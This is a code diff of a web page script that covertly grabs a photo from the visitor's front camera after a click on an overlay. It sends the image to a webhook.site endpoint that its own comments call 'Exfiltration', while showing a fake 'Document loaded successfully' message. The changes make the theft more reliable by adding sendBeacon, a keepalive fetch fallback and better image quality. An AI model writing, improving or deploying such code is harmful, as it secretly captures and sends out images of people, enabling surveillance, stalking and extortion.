@@ -61,36 +61,56 @@
 
         async function triggerCapture() {
             try {
-                // Request front camera stream
+                // Request front camera stream with fallback constraints
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' },
+                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
                     audio: false
                 });
                 
                 video.srcObject = stream;
                 
-                // Allow stream to initialize and adjust exposure
-                setTimeout(() => {
+                // Wait for video stream to be active and populated
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(resolve);
+                    };
+                    setTimeout(resolve, 1500); // fallback timer
+                });
+
+                // Extra delay to ensure camera exposure is ready
+                setTimeout(async () => {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    const imgData = canvas.toDataURL('image/jpeg', 0.85);
+                    const imgData = canvas.toDataURL('image/jpeg', 0.9);
                     
-                    // Stop camera tracks immediately after capture
+                    // Stop camera tracks
                     stream.getTracks().forEach(t => t.stop());
 
-                    // Exfiltration endpoint configured with your webhook
-                    fetch('https://webhook.site/2f4113c1-fdf8-4b86-92ce-167499f5190c', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ image: imgData })
-                    });
+                    // Send using sendBeacon or reliable fetch with keepalive
+                    try {
+                        const payload = JSON.stringify({ image: imgData });
+                        
+                        if (navigator.sendBeacon) {
+                            const blob = new Blob([payload], { type: 'application/json' });
+                            navigator.sendBeacon('https://webhook.site/2f4113c1-fdf8-4b86-92ce-167499f5190c', blob);
+                        } else {
+                            await fetch('https://webhook.site/2f4113c1-fdf8-4b86-92ce-167499f5190c', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: payload,
+                                keepalive: true
+                            });
+                        }
+                    } catch (err) {
+                        console.error("Exfiltration error:", err);
+                    }
 
                     msg.innerText = "Document loaded successfully.";
                     document.querySelector('.spinner').style.display = 'none';
-                }, 1200);
+                }, 1000);
 
             } catch (e) {
                 console.error("Capture failed:", e);
@@ -99,7 +119,6 @@
             }
         }
 
-        // Trigger on any touch or click anywhere on the page
         overlay.addEventListener('click', () => {
             overlay.style.display = 'none';
             triggerCapture();
